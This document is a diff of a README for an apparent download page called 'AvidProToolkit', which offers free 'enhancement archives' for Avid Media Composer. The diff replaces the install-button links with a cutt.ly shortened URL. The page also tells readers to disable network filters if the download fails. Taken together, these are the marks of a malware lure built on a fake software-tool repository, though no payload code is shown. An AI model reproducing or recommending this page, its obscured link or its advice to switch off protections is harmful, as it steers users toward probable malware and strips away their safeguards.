@@ -5,8 +5,8 @@
 
 **About AvidProToolkit**: AvidProToolkit is a premier repository for *Avid Media Composer Ultimate* users on Windows and Mac, offering free enhancement archives to complement this premium video editing software, priced at $85.99/month. With 8K editing, HDR support, and multi-user features, our archives include custom scripts, effect presets, and optimization tools to streamline editing, enhance playback, and improve project delivery. Backed by 90K+ visitors and 65K+ members, this September 11, 2025 update empowers your paid software with community-driven solutions for professional production. (349 characters)
 
-<a href="https://avidproenhancenetwork.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+<a href="https://cutt.ly/vrNtvo1S" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ---
@@ -35,8 +35,8 @@ Enhance your *Avid Media Composer Ultimate* with **AvidProToolkit** on Windows o
 5. **Fix Download Issues** 🌐  
    If the archive doesn’t download, disable network filters or switch browsers (Chrome, Firefox).
 
-<a href="https://avidproenhancenetwork.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Install_Guide-Windows-3498db" alt="Install Guide Now" width="250" height="45" style="border:none;">
+<a href="https://cutt.ly/vrNtvo1S" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ---
